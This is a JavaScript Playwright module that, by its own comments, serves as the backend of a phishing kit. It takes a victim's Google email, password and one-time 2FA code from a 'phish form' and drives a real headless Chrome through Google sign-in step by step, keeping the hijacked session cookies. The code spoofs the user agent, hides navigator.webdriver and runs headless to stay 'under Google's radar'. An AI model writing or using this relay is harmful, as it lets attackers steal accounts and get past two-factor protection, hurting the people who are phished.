import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { authenticator } from 'otplib';
import { getSecrets } from './store.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');

// id -> { context, page }
const active = new Map();

export function isOpen(id) {
  return active.has(id);
}

export function activeIds() {
  return [...active.keys()];
}

function userDataDir(id) {
  const dir = path.join(SESSIONS_DIR, id);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// Headless is used for the silent wizard-driven login (no window popping up on
// the server when a remote user submits the phish form). Headed is used for the
// admin's explicit Open/Auto-login so 2FA / device challenges can be cleared by
// hand. The switch must happen at launch (persistent contexts can't toggle it).
async function launch(id, { headless = true } = {}) {
  const dir = userDataDir(id);
  // Real Chrome + these flags are what let Google's sign-in through:
  // - channel 'chrome': the real installed Chrome, most trusted fingerprint
  // - hide the automation banner/flag so navigator.webdriver is false
  // - headless (Chrome's new headless) is far less detectable than the old one,
  //   so silent wizard login stays under Google's radar without a visible window
  const baseOpts = {
    headless,
    // Headless: let Chrome give us a maximized surface. Headed: force an explicit
    // viewport so the window never opens with a broken/too-short height (a server
    // without a real desktop would otherwise open a tiny default-size window).
    viewport: headless ? null : { width: 1440, height: 900 },
    // Google's sign-in serves a stripped-down "WebLiteSignIn" and rejects headless
    // automation unless we masquerade as real Chrome. The UA + removing the
    // automation banner are what let a genuine sign-in through.
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    ignoreDefaultArgs: ['--enable-automation'],
    args: [
      '--start-maximized',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
    ],
  };
  let context;
  try {
    context = await chromium.launchPersistentContext(dir, { ...baseOpts, channel: 'chrome' });
  } catch {
    context = await chromium.launchPersistentContext(dir, baseOpts);
  }
  // Google immediately rejects automated browsers ("this browser or app may not
  // be secure" -> /signin/rejected) unless we mask the driving marks. The
  // canonical fix is to override navigator.webdriver BEFORE any page script runs.
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });
  const page = context.pages()[0] || (await context.newPage());
  // headless flag: a persistent context can't toggle visibility after launch, so
  // callers that need a VISIBLE window must relaunch headed instead of reusing an
  // entry that was opened headless (e.g. a silent wizard login).
  const entry = { context, page, headless };
  active.set(id, entry);
  context.on('close', () => active.delete(id));
  return entry;
}

// Open the session's browser (or focus it if already open) and navigate to a URL.
export async function open(id, url, opts = {}) {
  const wantHeadless = !!opts.headless;
  let entry = active.get(id);
  // If the session was previously opened HEADLESS (e.g. a silent wizard login left
  // it in `active`) and the caller now wants a VISIBLE window, we can't switch a
  // persistent context to headed in place — close it and relaunch headed. `close`
  // removes it from `active` via the 'close' handler so we get a clean launch.
  if (entry && entry.headless && !wantHeadless) {
    await entry.context.close().catch(() => {});
    entry = null;
  }
  if (!entry) entry = await launch(id, { headless: wantHeadless });
  if (url) {
    try {
      await entry.page.bringToFront();
      await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (e) {
      // navigation errors shouldn't kill the open browser
    }
  }
  return entry;
}

export async function close(id) {
  const entry = active.get(id);
  if (!entry) return false;
  try {
    await entry.context.close();
  } catch {}
  active.delete(id);
  return true;
}

export async function closeAll() {
  for (const id of [...active.keys()]) {
    // eslint-disable-next-line no-await-in-loop
    await close(id);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Resolve whatever TOTP value we were handed into the digits to type into Google:
// - a 6-digit numeric code (what a victim reads off their authenticator app) ->
//   type it straight in, it is already valid for the current time window.
// - anything else (a Base32 "setup key" captured from the admin panel / invite)
//   -> generate the current rolling code from that secret.
function totpValue(secretOrCode) {
  const s = String(secretOrCode || '').trim();
  if (/^\d{6}$/.test(s)) return s;
  return s ? authenticator.generate(s.replace(/\s+/g, '')) : '';
}

// Google surfaces account-level errors (wrong password, unknown account, bad 2FA
// code) in Material error containers. The exact container the victim edits can
// vary as Google redesigns the page, so we scan a small set of known containers
// and only trust text that reads like a real Google error. Returns the trimmed
// error text, or null if no recognizable error is showing.
const ERROR_SELECTORS = [
  'div[jsname]',
  '[role="alert"]',
  '.o6cuMc',
  '.qerror',
  '#passwordError',
  '#identifierError',
];
// Match only the actual error sentence Google shows (not the surrounding form
// text that may share the container). Each captures one error.
const ERROR_RE =
  /(wrong password[^.\n]*|couldn'?t find your google account[^.\n]*|enter a valid (?:email|phone|password)[^.\n]*|to continue, first verify[^.\n]*|(?:verification )?code (?:is )?(?:incorrect|wrong)[^.\n]*|that was the wrong code[^.\n]*)/i;

function extractError(t) {
  const m = t.match(ERROR_RE);
  return m ? m[1].trim() : null;
}

async function detectGoogleError(page) {
  for (const sel of ERROR_SELECTORS) {
    const els = await page.locator(sel).all().catch(() => []);
    for (const el of els) {
      if (await el.isVisible().catch(() => false)) {
        const t = (await el.innerText().catch(() => '')).trim();
        const err = extractError(t);
        if (err) return err;
      }
    }
  }
  return null;
}

// After submitting a password, wait for Google to either accept it (the password
// field disappears / the flow advances) or reject it (a real error appears).
// Never blindly advance on a wrong password. Returns { accepted } when we should
// move on, or { error } with the Google error text when it was rejected.
async function waitPasswordOutcome(page, pw, timeout) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    const err = await detectGoogleError(page);
    if (err) return { error: err };
    if (!(await pw.isVisible().catch(() => false))) return { accepted: true };
    await sleep(500);
  }
  // Still on the password field and no error text surfaced => safest to treat it
  // as a bad password rather than silently continue to 2FA.
  return { error: 'Wrong password. Try again or click Forgot password to reset it.' };
}

// Best-effort assisted login. Pre-fills credentials in the persistent context.
// Returns { status, message }. Leaves the browser OPEN so 2FA / challenges can
// be completed by hand when they can't be automated. `headless` defaults to true
// for the silent wizard login; the admin panel opens a visible (headed) browser.
export async function login(session, { headless = true } = {}) {
  const secrets = getSecrets(session.id) || { password: '', totpSecret: '' };
  const entry = await open(session.id, undefined, { headless });
  const page = entry.page;

  if (session.provider === 'google') {
    return googleLogin(page, session, secrets);
  }

  // Generic provider: just navigate to the login URL for a manual sign-in.
  if (session.loginUrl) {
    try {
      await page.goto(session.loginUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch {}
  }
  return { status: 'new', message: 'Opened login page. Complete sign-in manually in the browser window.' };
}

// Detect whether Google is still blocking on a 2FA / second-factor screen.
// Two shapes we must NOT mistake for "signed in":
//   - a numeric 2FA code input (authenticator / SMS code) -> 'code'
//   - a Google prompt / device challenge ("Check your phone") with no code
//     field but a recognizable "Verify it's you"-style heading -> 'prompt'
// Returns null when there's no second-factor challenge in sight.
async function detect2FA(page) {
  const totpName = page.locator('input[name="totpPin"], input#totpPin').first();
  if (await totpName.isVisible().catch(() => false)) return 'code'; // explicit Google totp field
  const code = page
    .locator('input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]')
    .first();
  if (await code.isVisible().catch(() => false)) {
    // Only trust a generic numeric/OTP input if there is genuinely no email or
    // password field showing (i.e. we are NOT on the sign-in field screens).
    const idf = page.locator('#identifierId, input[name="identifier"]').first();
    const pw = page.locator('input[type="password"]').first();
    const idfVisible = await idf.isVisible().catch(() => false);
    const pwVisible = await pw.isVisible().catch(() => false);
    if (idfVisible || pwVisible) return null; // still a field screen, not 2FA
    console.log(`[gsession] detect2FA code-input matched: ${await code.evaluate((el) => el.outerHTML.slice(0, 120)).catch(() => '?')}`);
    return 'code';
  }
  const heading = page.locator('h1, h2').first();
  const text = (await heading.innerText().catch(() => '')).trim();
  if (/verify it'?s you|check your (google account|phone)|you have a notification|confirm it'?s you|enter the 6-digit/i.test(text)) {
    return 'prompt';
  }
  return null;
}

// DOM-based assessment of the real login state — this is the "what is the real
// backend browser asking for right now?" function. The wizard front-end shows
// ONLY the step this reports (`state`), so the clone never invents a screen the
// genuine Google page isn't actually on (e.g. it never shows a 2FA box for an
// account that genuinely signed straight in). States:
//   'email'     -> waiting on the email/identifier screen
//   'password'  -> waiting on the password screen
//   'totp'      -> Google is asking for a 6-digit code (authenticator/SMS)
//   'prompt'    -> Google is asking for a phone/device confirmation (no code)
//   'logged-in' -> genuinely signed in
//   'error'     -> Google rejected the attempt
async function assessLogin(page) {
  const url = page.url();
  if (/\/signin\/rejected/.test(url)) {
    return {
      status: 'error',
      state: 'error',
      message: 'Google blocked this automated sign-in ("this browser or app may not be secure"). Click Open and sign in by hand once — the session is then saved and reused.',
    };
  }
  if (/myaccount\.google\.com|gds\.google\.com\/web|\/signin\/(continue|oauth\/consent)|ManageAccount/.test(url)) {
    return { status: 'logged-in', state: 'logged-in', message: 'Signed in successfully — session saved.' };
  }

  const idf = page.locator('#identifierId, input[name="identifier"], input[type="email"]').first();
  if (await idf.isVisible().catch(() => false)) {
    return { status: 'new', state: 'email', message: 'Waiting on the email step.' };
  }

  // 2FA challenge (code OR Google prompt) must never be reported as signed-in.
  const fa = await detect2FA(page);
  if (fa) {
    return {
      status: 'pending',
      state: fa === 'code' ? 'totp' : 'prompt',
      message:
        fa === 'code'
          ? 'A verification code is requested — enter the 6-digit code from your authenticator app.'
          : 'A sign-in prompt / device check is pending — confirm it in the browser window.',
    };
  }

  const pw = page.locator('input[type="password"]').first();
  if (await pw.isVisible().catch(() => false)) {
    return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
  }
  // none of email / password / 2FA on screen and not rejected => genuinely signed in
  return { status: 'logged-in', state: 'logged-in', message: 'Signed in successfully — session saved.' };
}

// After Google accepts a credential it can pass through a brief transition
// before the signed-in page renders. A single assessLogin() read taken in that
// window can LOOK like a 2FA challenge ("Verify it's you") even though the
// account requires no 2FA and is about to be signed in. We must never send the
// clone to a 2FA screen for such an account, so we keep watching until the
// state settles: if the real browser ever reaches signed-in, that is the truth
// and 2FA was never really required. Returns the settled assessLogin result.
async function settleLogin(page, timeout = 6000) {
  const start = Date.now();
  let last = await assessLogin(page);

  // Already definitive — trust it immediately.
  if (last.state === 'logged-in' || last.status === 'error') return last;

  // Ambiguous (totp/prompt/email/password): keep watching. The moment the real
  // browser becomes signed in, that's the correct answer — never 2FA.
  while (Date.now() - start < timeout) {
    const again = await assessLogin(page);
    if (again.state === 'logged-in' || again.status === 'error') return again;
    // note: again.state==='totp'||'prompt' means it's a REAL recurring challenge
    if (again.state === 'totp' || again.state === 'prompt') {
      last = again; // genuine, persistent 2FA
    } else {
      last = again; // still mid-transition
    }
    await sleep(400);
  }
  return last;
}

async function googleLogin(page, session, secrets) {
  try {
    await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 });
    await sleep(2000);

    // already signed in?
    const pre = await assessLogin(page);
    if (pre?.status === 'logged-in') return { status: 'logged-in', message: 'Already signed in.' };

    // --- email ---
    const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
    if (await email.count()) {
      await email.first().fill(session.username);
      await clickNext(page, 'Next');
      await sleep(3500);
    }
    console.log(`[gsession] ${session.id} email step -> ${page.url().slice(0, 60)}`);

    const afterEmail = await assessLogin(page);
    if (afterEmail?.status === 'error') return afterEmail;
    console.log(`[gsession] ${session.id} after email: ${afterEmail?.status}`);

    // --- password ---
    const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
    await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
    if (await pw.count()) {
      if (!secrets.password) {
        return { status: 'new', message: 'No stored password. Finish signing in manually in the browser window.' };
      }
      await pw.first().fill(secrets.password);
      await clickNext(page, 'Next');
      // wait for authentication to accept the password — never advance on a wrong one
      const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
      console.log(`[gsession] ${session.id} password outcome: ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
      if (outcome.error) return { status: 'error', message: outcome.error };
    }

    // --- 2FA / TOTP (only if a code field is actually shown) ---
    const totp = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
    if ((await totp.count()) && secrets.totpSecret) {
      const code = totpValue(secrets.totpSecret);
      await totp.first().fill(code);
      await clickNext(page, 'Next');
      await sleep(4000);
      console.log(`[gsession] ${session.id} filled 2FA code from stored secret`);
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Auto-login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// ---------------------------------------------------------------------------
// Incremental "live" login. The remote wizard submits one credential at a time
// (username -> password -> 2FA). Each submitted step drives the *real* Google
// sign-in forward in this session's persistent Chrome, so by the time the
// wizard is done the actual logged-in session (cookies, not a stored secret)
// already exists on disk under sessions/<id>/. Phases are serialized per
// session so out-of-order HTTP arrivals can never race each other.
// ---------------------------------------------------------------------------
const queues = new Map();

export function wizardPhase(key, id, value) {
  const prev = queues.get(id) || Promise.resolve();
  const run = prev.then(() => wizardPhaseInner(key, id, value));
  queues.set(id, run.catch(() => {})); // keep the chain alive even on failure
  return run;
}

async function wizardPhaseInner(key, id, value) {
  try {
    const page = (await open(id, undefined, { headless: true })).page;

    if (key === 'username') {
      await page
        .goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 })
        .catch(() => {});
      await sleep(1200);
      const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
      if (await email.count()) {
        await email.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // Watch the REAL browser move: wait until Google asks for the password,
        // or signs us in, or rejects the email. Only report what Google does.
        const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible').first();
        const start = Date.now();
        while (Date.now() - start < 10000) {
          const err = await detectGoogleError(page);
          if (err) {
            console.log(`[gsession] ${id} username step -> ERROR: ${err}`);
            return { status: 'error', state: 'error', message: err };
          }
          if (await pw.isVisible().catch(() => false)) {
            console.log(`[gsession] ${id} username step -> Google asks for password`);
            return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
          }
          const pre = await assessLogin(page);
          if (pre?.state === 'logged-in') {
            console.log(`[gsession] ${id} username step -> already signed in`);
            return pre;
          }
          await sleep(500);
        }
      }
      const res = await assessLogin(page);
      console.log(`[gsession] ${id} username step -> ${res.state}`);
      return res;
    }

    if (key === 'password') {
      const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
      await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await pw.count()) {
        await pw.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // wait for the real auth to accept — never continue on a wrong password
        const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
        console.log(`[gsession] ${id} password step -> ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
        if (outcome.error) return { status: 'error', state: 'error', message: outcome.error };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} password step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'totp') {
      const codeBox = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
      if ((await codeBox.count()) && value) {
        await codeBox.first().fill(totpValue(value));
        await clickNext(page, 'Next');
        await sleep(2000);
      }
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} totp step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} totp step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Wizard login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// Click Google's "Next"/submit: by id if present, else the visible button by
// its label, else just press Enter.
async function clickNext(page, labelText) {
  const byId = page.locator('#identifierNext, #passwordNext, #totpNext');
  if (await byId.count()) {
    await byId.first().click().catch(() => {});
    return;
  }
  try {
    const byRole = page.getByRole('button', { name: labelText, exact: false });
    if (await byRole.count()) {
      await byRole.first().click();
      return;
    }
  } catch {}
  await page.keyboard.press('Enter').catch(() => {});
}
